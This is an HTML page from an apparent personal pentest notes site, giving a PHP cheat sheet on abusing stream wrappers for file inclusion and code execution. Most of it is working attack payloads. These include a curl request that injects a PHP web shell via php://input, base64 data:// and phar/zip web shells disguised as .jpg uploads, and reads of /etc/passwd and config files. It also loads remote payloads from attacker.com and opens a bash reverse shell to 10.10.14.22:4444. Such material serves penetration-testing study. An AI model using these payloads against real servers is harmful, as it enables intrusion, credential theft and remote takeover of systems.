<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="notion-container">
        <div class="notion-header">
            <h1>PHP</h1>
            <p>PHP (Hypertext Preprocessor) is an open-source, server-side scripting language used to create dynamic web pages</p>
        </div>
        <div class="notion-body">
            <h2>Credentials</h2>
            <ul>
                <p> Credentials may be located in the following files</p>
                <pre><code class="language-bash">.env</code></pre>
            </ul>
            
            <h2>PHP wrappers</h2>
            <ul>
                <p>In PHP, a wrapper is an abstraction layer that allows you to access different types of resources (files, streams, sockets, etc.) using the same set of standard PHP functions, such as fopen(), file_get_contents(), fwrite(), and so on.</p>
                <p>After diving through wrappers here it is an example of how to use them just is case someone forgot it</p>
                <pre><code class="language-url">http://victim.com/language.php?lan=php://filter/convert.base64-encode/resource=index.php</code></pre>
                
                <p>There are several types of wrappers</p>
                <h3>file://</h3>
                    <ul>
                       <p>Accessing local filesystem - via LFI or SSRF</p>
                       <pre><code class="language-php">file:///etc/passwd
file:///var/www/html/config.php</code></pre> 
                    </ul>
                <h3>http://</h3>
                    <ul>
                       <p>Accessing HTTP(s) URLs - Load malicious payload from remote server (you own)</p>
                       <pre><code class="language-php">http://attacker.com/shell.txt
http://127.0.0.1:8080/admin</code></pre> 
                    </ul>    
                <h3>ftp://</h3>
                    <ul>
                       <p>Accessing FTP(s) URLs - Retrieve file via FTP anonymously or not</p> 
                    <pre><code class="language-php">ftp://anonymous:anonymous@attacker.com/malicious.php
ftp://user:pass@attacker.com/evil.txt</code></pre>
                    </ul>
                <h3>php://</h3>
                <ul>
                   <p>I/O streams (LFI â†’ RCE) - Reveal source code </p>
                   <pre><code class="language-php">php://filter/convert.base64-encode/resource=index.php</code></pre>
                   <p>Or to inject php code - Send PHP payload in POST body</p>
                   <pre><code class="language-php">php://input</code></pre>
                   <pre><code class="language-php">curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://10.10.10.1:8080/index.php?language=php://input&cmd=id" | grep uid</code></pre>
                   <p>Remember to URL encode spaces (%20 (space) %08 (tab))</p> 
                </ul>

                <h3>zlib://</h3>
                    <ul>
                       <p>Compression Streams - Compressed file inclusion</p> 
                       <pre><code class="language-php">zlib://var/www/html/shell.php.gz</code></pre>
                    </ul>

                <h3>data://</h3>
                    <ul>
                       <p>Inline payloads - RCE if allow_url_include=On   (/etc/php/X.Y/fpm/php.ini)</p>
                       <pre><code class="language-php">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</code></pre> 
                    </ul>
                <h3>glob://</h3>
                    <ul>
                       <p>Find pathnames matching pattern - List files with a pattern</p>
                       <pre><code class="language-php">glob:///var/www/html/*.php</code></pre> 
                       
                    </ul>
                <h3>phar://</h3>
                    <ul>
                       <p>Find pathnames matching pattern</p>
                       <p>An attacker may use it to upload files to the server with changed extensions then using phar:// we can execute the uploaded file</p>

                       <p>Creation of the payload</p>
                       <pre><code class="language-php">&lt;?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '&lt;?php system($_GET["cmd"]); ?&gt;');
$phar->setStub('&lt;?php __HALT_COMPILER(); ?&gt;');

$phar->stopBuffering();</code></pre>
                    <p>Then compile the code</p>
                    <pre><code class="language-php">php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg</code></pre>
                    <p>Finally execute the script</p>
                    <pre><code class="language-php">phar://./profile_images/shell.jpg/shell.txt&cmd=id</code></pre>  
                    </ul>
                
                <h3>ssh2://</h3>
                    <ul>
                        <p>Secure Shell 2 - Remote shell execution via SSH (Remember to URL code the command part)</p>
                        <pre><code class="language-php">ssh2.exec://username:password@127.0.0.1/bash -c "bash -i >& /dev/tcp/10.10.14.22/4444 0>&1"</code></pre>  
                    </ul>
                <h3>rar://</h3>
                    <ul>
                        <p>Access files inside RAR file</p>
                        <pre><code class="language-php">rar:///var/www/html/backups/config.rar#config.php</code></pre>  
                    </ul>
                
                <h3>zip://</h3>
                    <ul>
                        <p>Access files inside zip file</p>
                        <p>Creation of the payload</p>
                        <pre><code class="language-php">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php && zip shell.jpg shell.php</code></pre>
                        <p>Access the file</p>
                        <pre><code class="language-php">zip://./profile_images/shell.jpg#shell.php&cmd=id</code></pre>  
                    </ul>    
                    
                <h3>ogg://</h3>
                    <ul>
                        <p>Audio streams - Abuse for arbitrary file reading if audio file path controlled:</p>
                        <p> An .ogg file is a multimedia container format, most commonly used for audio, but can also contain video, text, and metadata</p>
                        <pre><code class="language-php">ogg:///var/www/html/secret.ogg</code></pre>
                    </ul>
                <h3>expect://</h3>
                    <ul>
                        <p>Process Interaction Streams - Direct command ejecution</p>
                        <p>Not always installed, search for expect in /etc/php/X.Y/fpm/php.ini</p>
                        <pre><code class="language-php">expect://id</code></pre>  
                    </ul>                
            </ul>   
        </div>
    </div>


</body>
</html>